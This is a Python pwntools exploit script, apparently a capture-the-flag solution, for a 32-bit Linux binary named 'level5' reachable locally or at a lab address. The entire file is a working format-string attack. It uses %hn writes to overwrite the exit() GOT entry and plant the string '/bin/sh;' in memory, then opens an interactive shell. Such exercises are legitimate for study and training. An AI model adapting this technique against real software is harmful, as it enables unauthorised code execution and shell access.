#!/usr/bin/env python3
import argparse

from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'


def wait_for_prompt(r):
    print(r.recvuntil(b"Your choice :"))
    # r.recvuntil(b"Your choice :")


# --------------------------------------------------------------------------
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Exploit the bins.')
    parser.add_argument('--dbg', '-d', action="store_true")
    parser.add_argument('--remote', '-r', action="store_true")
    args = parser.parse_args()

    remote_server = '192.168.8.16'

    if args.remote:
        r = remote(remote_server, 4015)
    else:
        r = process('./level5')

    if args.dbg:
        gdb.attach(r, """
    vmmap
    b *main+99
    """)

    # ------------------------------------------------------------------------
    # Known Addresses
    GOT_EXIT = 0x804a020

    # ------------------------------------------------------------------------

    print(r.recvuntil(b"Give me something to say!"))
    r.clean()

    payload = b''
    payload += p32(GOT_EXIT)
    payload += f'%{int(0x85fd - 4)}c%11$hn'.encode()
    r.sendline(payload)

    payload = b''
    payload += p32(0x804a034)
    payload += f'%{int(0x622F - 4)}c%12$hn'.encode()
    r.sendline(payload)

    payload = b''
    payload += p32(0x804a034 + 2)
    payload += f'%{int(0x6E69 - 4)}c%13$hn'.encode()
    r.sendline(payload)

    payload = b''
    payload += p32(0x804a034 + 4)
    payload += f'%{int(0x732F - 4)}c%14$hn'.encode()
    r.sendline(payload)

    payload = b''
    payload += p32(0x804a034 + 6)
    payload += f'%{int(0x3B68 - 4)}c%15$hn'.encode()
    r.sendline(payload)

    payload = b''
    payload += p32(GOT_EXIT)
    payload += f'%{int(0x857b - 4)}c%16$hn'.encode()
    r.sendline(payload)

    """
    payload = ''
    payload += p32(0xAAAAAAAA)
    payload += f'%{int(0x85a5-4)}c%12$hn'.encode()
    r.sendline(payload)
    """

    # Drop to interactive console
    r.interactive()
